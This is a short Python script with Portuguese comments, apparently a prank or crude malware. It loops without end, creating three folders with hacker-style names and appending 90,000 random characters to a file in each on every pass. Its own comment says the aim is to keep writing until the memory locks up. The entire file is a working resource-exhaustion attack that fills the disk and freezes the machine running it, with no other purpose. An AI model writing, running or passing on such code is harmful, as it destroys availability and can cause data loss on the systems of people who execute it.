import os 
import random
import string

while True:
    os.makedirs("DarkParasites", exist_ok=True)
    with open(f"DarkParasites/bypass.txt", 'a') as arquivo:
         for _ in range(90000):
              arquivo.write(random.choice(string.ascii_letters + string.digits))

    os.makedirs("Th3_g3ntl3m4n", exist_ok=True)
    with open(f"Th3_g3ntl3m4n/t@nd3r@", 'a') as arquivo:
         for _ in range(90000):
              arquivo.write(random.choice(string.ascii_letters + string.digits))


    os.makedirs("J0aninh@s", exist_ok=True)
    with open(f"J0aninh@s/fsociety", 'a') as arquivo:
         for _ in range(90000):
              arquivo.write(random.choice(string.ascii_letters + string.digits))



#Cria 3 pastas, e fica colando caracteres dentro de um txt, até travar a memória.
    

